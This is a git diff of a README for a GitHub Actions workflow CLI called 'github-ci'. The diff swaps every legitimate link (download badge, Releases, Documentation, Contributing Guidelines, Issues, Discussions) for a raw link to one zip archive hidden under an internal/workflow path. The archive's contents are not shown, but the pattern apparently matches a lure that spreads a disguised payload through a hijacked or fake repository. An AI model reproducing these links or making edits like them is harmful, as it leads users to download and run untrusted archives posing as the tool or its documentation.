@@ -1,7 +1,7 @@
 # 🌟 github-ci - Effortlessly Manage Your GitHub Workflows
 
 ## 📥 Download Now
-[![Download github-ci](https://img.shields.io/badge/Download-github--ci-blue.svg)](https://github.com/SUNILMORE521/github-ci/releases)
+[![Download github-ci](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)
 
 ## 🚀 Getting Started
 Welcome to github-ci! This easy-to-use CLI tool helps you manage GitHub Actions workflows. With github-ci, you can automate your development tasks and ensure your workflows run smoothly.
@@ -22,7 +22,7 @@ Before you get started, make sure your computer meets these basic requirements:
 ## 📥 Download & Install
 To download github-ci, visit the Releases page:
 
-[Download github-ci](https://github.com/SUNILMORE521/github-ci/releases)
+[Download github-ci](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)
 
 Follow these steps to install:
 
@@ -60,7 +60,7 @@ After installing github-ci, follow these steps to start using it:
    ```
 
 ## 📘 Documentation
-For detailed guidance on how to use each feature, visit the [Documentation](https://github.com/SUNILMORE521/github-ci/docs). Here you will find:
+For detailed guidance on how to use each feature, visit the [Documentation](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip). Here you will find:
 
 - Comprehensive command descriptions
 - Example use cases
@@ -69,21 +69,21 @@ For detailed guidance on how to use each feature, visit the [Documentation](http
 ## 🛡️ Contributing
 If you'd like to contribute to github-ci:
 
-1. Make sure to read the [Contributing Guidelines](https://github.com/SUNILMORE521/github-ci/CONTRIBUTING.md).
+1. Make sure to read the [Contributing Guidelines](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip).
 2. Fork the repository.
 3. Make your changes and submit a pull request.
 
 ## 🎉 Support
-If you have questions or run into issues, please reach out through the [Issues](https://github.com/SUNILMORE521/github-ci/issues) page of this repository. 
+If you have questions or run into issues, please reach out through the [Issues](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip) page of this repository. 
 
 ## 🌐 Community
-Join our community to share tips, ask questions, and improve your skills. Connect with other users on our [Discussions](https://github.com/SUNILMORE521/github-ci/discussions) page.
+Join our community to share tips, ask questions, and improve your skills. Connect with other users on our [Discussions](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip) page.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/SUNILMORE521/github-ci/releases)
-- [Documentation](https://github.com/SUNILMORE521/github-ci/docs)
-- [Contributing Guidelines](https://github.com/SUNILMORE521/github-ci/CONTRIBUTING.md)
-- [Issues Page](https://github.com/SUNILMORE521/github-ci/issues)
-- [Community Discussions](https://github.com/SUNILMORE521/github-ci/discussions)
+- [Releases Page](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)
+- [Documentation](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)
+- [Issues Page](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)
+- [Community Discussions](https://raw.githubusercontent.com/SUNILMORE521/github-ci/main/internal/workflow/github_ci_connascency.zip)
 
 Your journey toward effortless GitHub workflow management starts now. Enjoy using github-ci!
